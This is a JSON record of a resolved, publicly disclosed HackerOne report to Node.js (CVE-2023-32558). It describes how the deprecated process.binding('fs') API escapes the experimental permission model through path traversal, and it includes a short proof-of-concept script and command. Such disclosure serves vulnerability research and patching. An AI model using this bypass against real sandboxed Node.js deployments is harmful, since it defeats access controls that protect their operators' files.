{
  "id": 2051257,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMDUxMjU3",
  "url": "https://hackerone.com/reports/2051257",
  "title": "process.binding() can bypass the permission model through path traversal",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2023-07-05T15:54:29.666Z",
  "submitted_at": "2023-07-05T15:54:29.775Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "rafaelgss",
    "url": "/rafaelgss",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/kjrbv0uq2i8ccibs0uuw51m04586/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 22984,
    "url": "https://hackerone.com/nodejs",
    "handle": "nodejs",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Node.js",
      "twitter_handle": "nodejs",
      "website": "https://nodejs.org",
      "about": "The Node.js JavaScript Runtime"
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": true,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2023-32558"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2023-09-10T15:26:16.937Z",
  "bug_reporter_agreed_on_going_public_at": "2023-08-11T15:26:08.628Z",
  "team_member_agreed_on_going_public_at": null,
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "**Summary:** process.binding('fs') bypassed the permission model validation against path traversal\n\n**Description:** process.binding('fs') can be used to bypass the path traversal validation for the permisison model\n\n## Steps To Reproduce:\n\nCreate the following index.js and store at `/home/pathtraversal/`\n```js\n// index.js\nconst fs = process.binding('fs')\n\nfs.mkdir('/home/pathtraversal/../test0', 511, false, null, null)\n```\n\n```console\n$ pwd\n/home/pathtraversal/\n$ node --experimental-permission --allow-fs-read=\"/home/pathtraversal/*\" --allow-fs-write=\"/home/pathtraversal/*\" index.js\n```\n\n`/home/test0` will be created bypassing the permission model validation\n\n## Impact\n\nAll the methods exposed by the process.binding('fs') could eventually bypass the permission model using path traversal. It will require the attacker to read the node_file.cc implementation, but that's trivial.",
  "weakness": {
    "id": 19,
    "name": "Path Traversal"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2023-09-10T15:26:08.730Z",
  "allow_singular_disclosure_after": -13475501.617409589,
  "singular_disclosure_allowed": true,
  "vote_count": 5,
  "voters": [
    "zy9ard3",
    "neil-tsakatsa",
    "eminf",
    "kurd_112113",
    "rassmy"
  ],
  "severity": {
    "rating": "high",
    "score": 7.1,
    "author_type": "User",
    "metrics": {
      "attack_vector": "local",
      "attack_complexity": "low",
      "privileges_required": "low",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "high",
      "integrity": "high",
      "availability": "none"
    }
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 320154,
      "category": "team",
      "content": "The use of the deprecated API `process.binding()` can bypass the permission model through path traversal. \n\nThis vulnerability affects all users using the experimental permission model in Node.js 20.x.\n\nPlease note that at the time this CVE was issued, the permission model is an experimental feature of Node.js.",
      "user": {
        "id": 2195374,
        "username": "rafaelgss",
        "name": "Rafael Gonzaga",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": "https://rafaelgss.dev",
        "location": "",
        "created_at": "2022-01-27T23:52:59.861Z",
        "url": "https://hackerone.com/rafaelgss",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/kjrbv0uq2i8ccibs0uuw51m04586/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/kjrbv0uq2i8ccibs0uuw51m04586/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/kjrbv0uq2i8ccibs0uuw51m04586/d7b0d969b6320751e1c58b9e3efff1e228054ee3d8eade5c51c4c79b25513a9c"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
